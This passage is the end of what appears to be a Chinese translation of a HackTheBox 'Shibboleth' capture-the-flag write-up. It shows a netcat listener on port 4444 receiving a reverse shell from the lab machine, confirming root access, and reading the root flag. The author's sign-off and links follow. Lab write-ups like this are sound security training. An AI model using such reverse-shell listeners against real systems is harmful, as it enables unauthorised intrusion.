class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="3917" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/shibboleth]<br/>└─# nc -nlvp 4444<br/>listening on [any] 4444 ...<br/>connect to [10.10.14.62] from (UNKNOWN) [10.10.11.124] 33088</span><span id="03a6" class="mx km iq mt b gy nq mz l na nb">id<br/>uid=0(root) gid=0(root) groups=0(root)</span><span id="f5b2" class="mx km iq mt b gy nq mz l na nb">cat /root/root.txt<br/>064275d7a96d3f300917a45b59bf97b6</span></pre><p id="762b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">完成了。下次见。</p></div><div class="ab cl nr ns hu nt" role="separator"><span class="nu bw bk nv nw nx"/><span class="nu bw bk nv nw nx"/><span class="nu bw bk nv nw"/></div><div class="ij ik il im in"><p id="d920" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)</p><p id="ed50" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">推特—<a class="ae nk" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>网站— <a class="ae nk" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="d32c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="ny">原载于2022年4月25日</em><a class="ae nk" href="https://pencer.io/ctf/ctf-htb-shibboleth/" rel="noopener ugc nofollow" target="_blank"><em class="ny">https://pencer . io</em></a><em class="ny">。</em></p></div></div>    
</body>
</html>